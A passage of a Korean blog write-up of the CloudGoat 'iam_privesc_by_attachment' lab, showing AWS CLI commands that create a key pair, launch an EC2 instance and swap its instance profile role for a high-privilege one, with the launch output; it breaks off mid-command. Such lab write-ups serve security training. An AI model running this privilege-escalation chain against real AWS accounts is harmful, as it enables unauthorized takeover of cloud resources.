액세스를 허용하는 보안 그룹을 분석하였습니다.</li>\n</ul>\n<h3 id=\"ec2-key-pair-생성\" style=\"position:relative;\"><a href=\"#ec2-key-pair-%EC%83%9D%EC%84%B1\" aria-label=\"ec2 key pair 생성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EC2 Key pair 생성</h3>\n<ul>\n<li>앞선 필요한 정보들을 수집한후 AWS 계정에서 기존 key-pair를 사용할 수 없기 때문에 새로운 SSH key-pair를 생성하였습니다. 생성할 수 있는 EC2 머신에서 SSH 연결하려면 새로운 key-pair가 필요합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 create-key-pair \\\n    --key-name fake-ec2  \\\n    --query 'KeyMaterial' \\\n    --output text > fake-ec2.pem \\\n    --region us-east<span class=\"token number\">-1</span> \\\n    --profile kerrigan</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACP0lEQVQ4y4VRXU9TQRBdeovQNoQC8lVLkEIpFNr7uXv3fu+9t6UFUR6UByX6QtAnE302/vZjZgsaE8SHkzMzmzk7Z4YFXQ9+x0W8LzB4OUCra6J2HKG928PB3gnszT7CXRfhrgO5YyHa85B0OOIOR96ViA4Frhsuvi5leNvwwL5F1/gxucPP6BPe8Qs4yRh9OUHvlMM7lrht5fjSLvH5HrdbCjdNiZsViY+rIT6sBbh75uP7QoL3Cy6Yl05gyhwnIoNIJvBlCcEVHE/B5gpmVOJUKtjJSHP7yAJjNTBW/wOjDlapgRkNMI8r2E6KoRlp5n4By03hcKVj11Pw/RJCUJyh13NhGE1Uq6t/Yf6eWZJdIEqmSNUrUFyMrnQcRGezmrpAXr7Rb5T3TyXmjCYq1ZVHwagxTKaI0ik8v0AQT+AHI3ii0KJxeq5rYTzRgt0jF6yy/G9B2pXlpHC8DKYdw3ISbZVANYIfjDXbXoa9A/PpCR8s++FYN9JEBKrTpDRVll8iIS4ucTKQT09ItgjUzGUJGY4169wv9GfiPif0jvnTE5IVlysM7Ri2m8EVObhfziy66W/bQyvSHxz+b4d0wTg714fRVx5fIR9dIUrPkeYzu3QQeiPLdOVHBY0ZGAmRlQfbQXiGJJ1q66p4rS9M+xPBCAMzQufA0oJkmxlNzFVmzKrLYNUmmCcUhCxAzIVCfxhgc9/G9otDtHeO0Gr3dNxY2sZC7Tlq9Q0s1tc11xubWGxsYG1+C22jhXVjC78Ac5+De3qwFowAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"11\"\n        title=\"11\"\n        src=\"/static/33d226002a7b47a93a98a8cfc082615f/37523/11.png\"\n        srcset=\"/static/33d226002a7b47a93a98a8cfc082615f/e9ff0/11.png 180w,\n/static/33d226002a7b47a93a98a8cfc082615f/f21e7/11.png 360w,\n/static/33d226002a7b47a93a98a8cfc082615f/37523/11.png 720w,\n/static/33d226002a7b47a93a98a8cfc082615f/136a2/11.png 884w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 key-pair를 생성하였습니다.</li>\n<li>새로운 EC2 인스턴스를 생성하는 데 있어서 필요한 모든 정보들을 수집하였고 이에 대해 EC2 인스턴스를 생성하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABQUlEQVQoz51R207CQBDtT+EPgPwG/g6PQISv0fRR+wDPhsQovdcqTQvstT1mtt1qiCHESU5mZ3bmzNlZZ/seIQhjvGxf4YcxHh5d3E0muF+ukOVf2AURgjhFmGZ42wUIohR+mCBKMvhR65Ms784fcISqoXQNJiTInp49jMe3mM3mJmZcQiptIKRqYeL6B7r1Sjdw0FlT18av12uMRiOsVksT113+WnOapgFBa20Sm80Gw+EQ83mrkPK25hr0Ci2h53m4GQwwnU7/R1iVBYqiAOfCEPi+j8ViAdd1LxKaNf1FyBnD8XhEVVUoy7Ivtvs7J+Gc43A4mFrqsTidTma4ebIQAkkcmwtqYIz1yjopvdo0SbDf700PDaQcwQ43n0JE9GwqIjILKWVfaAk/8xyM8cu/THKJjAjOQfnfa1BKXdzhN6ye+s4328RsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"12\"\n        title=\"12\"\n        src=\"/static/2538f46ed86b9378dbc55894c66ee7c3/37523/12.png\"\n        srcset=\"/static/2538f46ed86b9378dbc55894c66ee7c3/e9ff0/12.png 180w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/f21e7/12.png 360w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/37523/12.png 720w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/302a4/12.png 1080w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/07a9c/12.png 1440w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/1f038/12.png 1481w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token number\">1</span>. 대상 EC2 인스턴스와 동일한 서브넷\n<span class=\"token number\">2</span>. SSH 액세스를 허용하는 보안 그룹\n<span class=\"token number\">3</span>. SSH 인증을 위한 SSH 키 쌍으로 새로 생성\n<span class=\"token number\">4</span>. cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu 인스턴스 프로필 연결\n\naws ec2 run-instances \\\n    --image-id ami-0a313d6098716f372 \\\n    --instance-type t2.micro \\\n    --iam-instance-profile Arn=arn<span class=\"token operator\">:</span>aws<span class=\"token operator\">:</span>iam<span class=\"token operator\">:</span><span class=\"token operator\">:</span>&lt;USERID><span class=\"token operator\">:</span>instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu \\\n    --key-name fake-ec2 \\\n    --subnet-id subnet-04d05182b53c1ff11 \\\n    --security-group-ids sg-04ffcf8e873ee2103 \\\n    --region us-east<span class=\"token number\">-1</span> \\\n    --profile kerrigan\n\narn<span class=\"token operator\">:</span>aws<span class=\"token operator\">:</span>iam<span class=\"token operator\">:</span><span class=\"token operator\">:</span>&lt;USERID><span class=\"token operator\">:</span>instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 91.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAACZUlEQVQ4y5VUyXLaUBAUi80ugQQIEIsWdoEA2QUIDIUxiZ3C8SWHnPIbIa5K5Q/yMfnCTs0IiC8BfGi9V5Jeq6enR8K62cXDYoVO28XK22A9XWN4/wXu/Bk7+wW/rBe8Glvsqk/4XnnCrvYJr/qW15/mZ/wwn/E79og/ia/4Fh1DSMTzMEwHcs5E1/HguEsMBx6Gozkm7j369VtYWg+aUkcpYyIv1hgFyUAuVYUq6pBlHZJSQzShQkgrOopaG72+h0bTRbN9C7MxQlXvoWL0oOk25LyBcCyLUFRBKKIgFPX3/r0swtcKriJZhK5kCHRRiw2Mpw9whnOMpxsY1gC66TC0SgdJUUMglL4IQiSWh5IzoBabvEqZCoSgBEFI8RoMZ94FVlgzHS4xLddwHc0hlij4D4k0IB6JScFZwsNBOavD7nsw60NGo3UDqzHisqlkeudAeorYJwyIyBfq7J/teKg3XQzdBZMWtRayeRPRuPoOhQEJUqaKwWjBZAcLSFkiVWRfxXT5ckJ6MZ4solBqMtJyFWK6wn5S0ygWb308W7K/kdizifeBY0PEVGYiVfIDS50PiEey/5EKBzIqL6danDvyjLwjX+WsweWmCFL5bLePXSZF3vwjlqsteo7HRAWtxR9ISRriyQLbchlhUOLsUclEQHtOvZD8l8V9Hi8qmR6S+Ydx0y0H5WqXm0INIdAAvD142sOAiJxaR8+ZsXcde8IR6g9mHCOaIB78vdJTKvceiscfxOhmicHoDrO7R56YjKJzhKghlEeKFCk+q5A6O/E2sPtTf+Qsh70kULgpPkRKDTpF+Be8qb6OycpiBQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"13\"\n        title=\"13\"\n        src=\"/static/e125104d7ab09f203228d9435f880f44/37523/13.png\"\n        srcset=\"/static/e125104d7ab09f203228d9435f880f44/e9ff0/13.png 180w,\n/static/e125104d7ab09f203228d9435f880f44/f21e7/13.png 360w,\n/static/e125104d7ab09f203228d9435f880f44/37523/13.png 720w,\n/static/e125104d7ab09f203228d9435f880f44/84cc5/13.png 898w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJElEQVQoz12QCW/CMAyF+///4CYBE2J0vTjWtImPHG9KWjrA0qfnJvazm+r7csOuueKjHnBoe3yeT9jXHb6aAV9NX3Rft9idWxx+Ohz7K3bnBsfuivo24jTc0RqLdszMqC7DgL7rME8GTA7sCOQcKOdEhSV3YKZNVaXgswqvCKrZWkyzBRGDRUDMYGaIKmKMGyGsxAUfwkZ40mo0UynIkfAf1royyGlAiAlICSktFY4I1lq8R76vsmtai9NTk7EGLIzFK20NyzCL0RgwS/kbFgXp4lM55+C9f5mSIz+FiJTNHucFAKpaesp3jEXjel/dZ0ZmIoWGuBnnQdM0wTmCiBZYA9hHEAtIfMnLmQZY8cW0+rUC4xQzaXmr501eNnsjxlcevX/mZXCgAvxZpAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"14\"\n        title=\"14\"\n        src=\"/static/b9e28e89a69c9f6fb0f7e18c875fd940/37523/14.png\"\n        srcset=\"/static/b9e28e89a69c9f6fb0f7e18c875fd940/e9ff0/14.png 180w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/f21e7/14.png 360w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/37523/14.png 720w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/302a4/14.png 1080w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/07a9c/14.png 1440w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/dca52/14.png 1550w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>새로운 EC2 인스턴스를 성공적으로 생성할 수 가 있습니다. 출력되는 정보는 새 EC2 인스턴스의 세부정보이기 때문에 저장을 해둡니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n    <span class=\"token property\">\"Groups\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"Instances\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token property\">\"AmiLaunchIndex\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"ImageId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ami-0a313d6098716f372\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"InstanceId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"i-0a726b6396cec2a5e\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"InstanceType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"t2.micro\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"KeyName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"fake-ec2\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"LaunchTime\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-08-12T18:29:38+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Monitoring\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"State\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"disabled\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Placement\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"AvailabilityZone\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"us-east-1a\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"GroupName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Tenancy\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"default\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"PrivateDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ip-10-0-10-102.ec2.internal\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"PrivateIpAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"10.0.10.102\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"ProductCodes\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"PublicDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"State\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Code\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"StateTransitionReason\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"SubnetId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"subnet-04d05182b53c1ff11\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"VpcId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"vpc-01585d6620e5d752f\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Architecture\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"x86_64\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"BlockDeviceMappings\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"ClientToken\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"8e003941-0ceb-47b4-9730-71cb25aa529d\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"EbsOptimized\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"EnaSupport\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Hypervisor\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"xen\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"IamInstanceProfile\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Arn\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"AIPA2MALBVI5RQHINFLHJ\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"NetworkInterfaces\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Attachment\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token property\">\"AttachTime\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-08-12T18:29:38+00:00\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"AttachmentId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"eni-attach-03cf3a976529cfabe\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"DeleteOnTermination\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"DeviceIndex\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"Status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"attaching\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"NetworkCardIndex\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Groups\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                        <span class=\"token punctuation\">{</span>\n                            <span class=\"token property\">\"GroupName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-ssh-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n                            <span class=\"token property\">\"GroupId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"sg-04ffcf8e873ee2103\"</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Ipv6Addresses\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"MacAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0a:fc:1e:7d:bf:59\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"NetworkInterfaceId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"eni-0aad79f50a762977a\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"OwnerId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;USERID>\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"PrivateDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ip-10-0-10-102.ec2.internal\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"PrivateIpAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"10.0.10.102\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"PrivateIpAddresses\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                        <span class=\"token punctuation\">{</span>\n                            <span class=\"token property\">\"Primary\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n                            <span class=\"token property\">\"PrivateDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ip-10-0-10-102.ec2.internal\"</span><span class=\"token punctuation\">,</span>\n                            <span class=\"token property\">\"PrivateIpAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"10.0.10.102\"</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"SourceDestCheck\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"in-use\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"SubnetId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"subnet-04d05182b53c1ff11\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"VpcId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"vpc-01585d6620e5d752f\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"InterfaceType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"interface\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"RootDeviceName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"/dev/sda1\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"RootDeviceType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ebs\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"SecurityGroups\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"GroupName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-ssh-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"GroupId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"sg-04ffcf8e873ee2103\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"SourceDestCheck\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"StateReason\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Code\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Message\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"VirtualizationType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"hvm\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"CpuOptions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"CoreCount\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"ThreadsPerCore\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"CapacityReservationSpecification\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"CapacityReservationPreference\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"open\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"MetadataOptions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"State\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"HttpTokens\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"optional\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"HttpPutResponseHopLimit\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"HttpEndpoint\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"enabled\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"EnclaveOptions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Enabled\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"OwnerId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;USERID>\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"ReservationId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"r-04495e19ef68a6678\"</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"최고-관리자-iam-instance-프로필을-새로운-ec2-instance로-변경\" style=\"position:relative;\"><a href=\"#%EC%B5%9C%EA%B3%A0-%EA%B4%80%EB%A6%AC%EC%9E%90-iam-instance-%ED%94%84%EB%A1%9C%ED%95%84%EC%9D%84-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2-instance%EB%A1%9C-%EB%B3%80%EA%B2%BD\" aria-label=\"최고 관리자 iam instance 프로필을 새로운 ec2 instance로 변경 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>최고 관리자 IAM Instance 프로필을 새로운 EC2 Instance로 변경</h3>\n<ul>\n<li>앞서 새로운 EC2 Instance를 생성했습니다. 인스턴스 Rule <code class=\"language-text\">cg-ec2-meek-instance-profile-/cloud-goat-id</code> 은 여전히 권한이 낮은 IAM Rule이기 때문에 이를 제거하고 인스턴스 프로파일에 IAM 역할을 추가하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam remove-role-from-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu \\\n    --role-name cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu --profile kerrigan\n\naws iam add-role-to-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu \\\n    --role-name cg-ec2-mighty-role-iam_privesc_by_attachment_cgidmbi301d8zu --profile kerrigan\n\naws iam remove-role-from-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-&lt;CLOUD_GOAT_ID> \\\n    --role-name 